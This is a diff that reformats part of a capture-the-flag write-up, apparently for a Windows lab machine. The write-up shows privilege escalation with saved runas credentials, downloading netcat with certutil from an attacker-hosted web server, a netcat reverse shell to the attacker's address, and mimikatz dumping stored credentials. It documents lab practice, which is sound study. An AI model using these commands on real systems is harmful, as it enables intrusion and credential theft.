@@ -116,15 +116,22 @@ At this point, we have stored Admin credentials and can use them via the runas c
 runas.exe /savecred /user:ACCESS\Administrator "cmd.exe /c type C:\Users\Administrator\Desktop\root.txt > C:\Users\Security\root.txt"
 ```
 <img width="1259" height="63" alt="image" src="https://github.com/user-attachments/assets/8dbda07b-d47b-4a5a-ad49-5b059f3d41d3" />
+
 _Reading root.txt_
 
 # Decrypting the Administrator password
 It felt a little wrong to only get the root flag since the credentials were sitting right there behind DPAPI, so I went back to trying to get a shell so that I could work on decrypting the password. I continued to have issues getting a powershell command to work when wrapped within the runas command. To work around that, I first uploaded netcat to the server with certutil and a python webserver.
-`python3 -m http.server 8081`
-`certutil.exe -urlcache -f http://10.10.XX.XX:8081/nc.exe nc.exe`
+```
+python3 -m http.server 8081
+```
+```
+certutil.exe -urlcache -f http://10.10.XX.XX:8081/nc.exe nc.exe
+```
 
 I then used this netcat executable alongside `runas.exe` to get a shell as the Administrator account.
-`runas /user:Administrator /savecred "nc.exe -e cmd.exe 10.10.XX.XX 4445"`
+```
+runas /user:Administrator /savecred "nc.exe -e cmd.exe 10.10.XX.XX 4445"
+```
 <img width="521" height="214" alt="image" src="https://github.com/user-attachments/assets/01382220-5422-4962-bf3a-e470bdc4cfd9" />
 
 Finally, I transferred a mimikatz executable from my attacking machine in the same way I did with netcat. I then ran mimikatz as the Administrator user and executed the credman module which is able to show us the stored credentials in plaintext.
